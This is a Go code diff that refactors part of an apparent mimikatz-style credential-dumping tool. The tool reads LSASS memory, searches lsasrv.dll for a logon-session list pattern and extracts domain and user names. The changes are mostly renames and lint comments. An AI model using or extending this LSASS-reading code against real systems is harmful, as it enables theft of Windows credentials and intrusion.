@@ -233,15 +233,6 @@ var (
 )
 
 func (session *session) searchAddresses(pHandle windows.Handle) error {
-	var patches []*patchGeneric
-	switch runtime.GOARCH {
-	case "386":
-		patches = lsaSrvReferencesX86
-	case "amd64":
-		patches = lsaSrvReferencesX64
-	}
-	_, _, build := session.ctx.getWindowsVersion()
-	patch := selectGenericPatch(patches, build)
 	lsasrv, err := session.ctx.lsass.GetBasicModuleInfo(pHandle, "lsasrv.dll")
 	if err != nil {
 		return err
@@ -253,6 +244,14 @@ func (session *session) searchAddresses(pHandle windows.Handle) error {
 		return errors.WithMessage(err, "failed to read memory about lsasrv.dll")
 	}
 	// search logon session list pattern
+	var patches []*patchGeneric
+	switch runtime.GOARCH {
+	case "386":
+		patches = lsaSrvReferencesX86
+	case "amd64":
+		patches = lsaSrvReferencesX64
+	}
+	patch := session.ctx.selectGenericPatch(patches)
 	index := bytes.Index(memory, patch.search.data)
 	if index == -1 {
 		return errors.WithMessage(err, "failed to search logon session list reference pattern")
@@ -282,6 +281,7 @@ func (session *session) searchAddresses(pHandle windows.Handle) error {
 // reference:
 // https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.h
 
+// nolint:structcheck, unused
 type msv10List51 struct {
 	fLink         uintptr // point to msv10List51
 	bLink         uintptr // point to msv10List51
@@ -304,6 +304,7 @@ type msv10List51 struct {
 	credentialMgr uintptr
 }
 
+// nolint:structcheck, unused
 type msv10List52 struct {
 	fLink         uintptr // point to msv10List52
 	bLink         uintptr // point to msv10List52
@@ -325,6 +326,7 @@ type msv10List52 struct {
 	credentialMgr uintptr
 }
 
+// nolint:structcheck, unused
 type msv10List60 struct {
 	fLink         uintptr // point to msv10List60
 	bLink         uintptr // point to msv10List60
@@ -362,6 +364,7 @@ type msv10List60 struct {
 	credentialMgr uintptr
 }
 
+// nolint:structcheck, unused
 type msv10List61 struct {
 	fLink         uintptr // point to msv10List61
 	bLink         uintptr // point to msv10List61
@@ -398,6 +401,7 @@ type msv10List61 struct {
 	credentialMgr uintptr
 }
 
+// nolint:structcheck, unused
 type msv10List61AntiKiwi struct {
 	fLink         uintptr // point to msv10List61AntiKiwi
 	bLink         uintptr // point to msv10List61AntiKiwi
@@ -435,6 +439,7 @@ type msv10List61AntiKiwi struct {
 	credentialMgr uintptr
 }
 
+// nolint:structcheck, unused
 type msv10List62 struct {
 	fLink         uintptr // point to msv10List62
 	bLink         uintptr // point to msv10List62
@@ -480,6 +485,7 @@ type msv10List62 struct {
 	credentialMgr uintptr
 }
 
+// nolint:structcheck, unused
 type msv10List63 struct {
 	fLink         uintptr // point to msv10List63
 	bLink         uintptr // point to msv10List63
@@ -680,8 +686,8 @@ func (session *session) selectLSAEnum(pHandle windows.Handle) (*lsaEnum, error) 
 	return lsaEnums[i], nil
 }
 
-// LogonSession contains information about session.
-type LogonSession struct {
+// Session contains information about logon session.
+type Session struct {
 	LogonID     windows.LUID
 	Session     uint32
 	Domain      string
@@ -691,7 +697,7 @@ type LogonSession struct {
 	SID         string
 }
 
-func (session *session) GetLogonSessionList(pHandle windows.Handle) ([]*LogonSession, error) {
+func (session *session) GetLogonSessionList(pHandle windows.Handle) ([]*Session, error) {
 	session.mu.Lock()
 	defer session.mu.Unlock()
 	if session.listAddr == 0 {
@@ -714,7 +720,7 @@ func (session *session) GetLogonSessionList(pHandle windows.Handle) ([]*LogonSes
 		return nil, errors.WithMessage(err, "failed to select lsa enum")
 	}
 	// get session list
-	var logonSessions []*LogonSession
+	var logonSessions []*Session
 	const listEntrySize = 2 * unsafe.Sizeof(uintptr(0))
 	listAddr := session.listAddr - listEntrySize
 	// prevent dead loop
@@ -756,7 +762,7 @@ func (session *session) GetLogonSessionList(pHandle windows.Handle) ([]*LogonSes
 	return logonSessions, nil
 }
 
-func (session *session) readSession(pHandle windows.Handle, buf []byte, enum *lsaEnum) (*LogonSession, error) {
+func (session *session) readSession(pHandle windows.Handle, buf []byte, enum *lsaEnum) (*Session, error) {
 	domainNameLus := (*api.LSAUnicodeString)(unsafe.Pointer(&buf[enum.offsetToDomainName]))
 	domainName, err := api.ReadLSAUnicodeString(pHandle, domainNameLus)
 	if err != nil {
@@ -781,7 +787,7 @@ func (session *session) readSession(pHandle windows.Handle, buf []byte, enum *ls
 		}
 	}
 	logonID := *(*windows.LUID)(unsafe.Pointer(&buf[enum.offsetToLogonID]))
-	logonSession := LogonSession{
+	logonSession := Session{
 		LogonID:     logonID,
 		Domain:      domainName,
 		Username:    username,
